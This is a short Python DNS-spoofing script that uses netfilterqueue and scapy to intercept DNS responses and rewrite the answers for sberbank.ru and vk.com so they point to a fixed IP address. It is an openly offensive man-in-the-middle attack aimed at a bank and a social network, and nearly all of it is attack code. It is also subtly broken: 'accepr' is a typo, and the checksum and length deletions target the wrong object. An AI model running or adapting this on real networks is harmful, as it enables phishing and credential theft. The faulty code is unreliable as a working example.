import netfilterqueue
import scapy.all

sites = {'sberbank.ru': '178.248.236.218', 'vk.com': '178.248.236.218'}


def spoof_packet(packet):
    #check is pack is DNS and change it
    getting_packet = scapy.all.IP(packet.get_payload())
    if getting_packet.haslayer(scapy.all.DNSRR):
        qname = getting_packet[scapy.all.DNSQR].qname
        for site in sites:
            if site in qname:
                dns_response = scapy.all.DNSRR(rrname=qname, rdata=sites[site])
                getting_packet[scapy.all.DNS].an = dns_response
                dns_response[scapy.all.DNS].ancount = 1

                del dns_response[scapy.all.IP].len
                del dns_response[scapy.all.IP].chksum
                del dns_response[scapy.all.UDP].len
                del dns_response[scapy.all.UDP].chksum

                packet.set_payload(str(getting_packet))
            packet.accepr()


def main():
    # created queue previously and work with it
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, spoof_packet)
    queue.run()


if __name__ == "__main__":
    main()
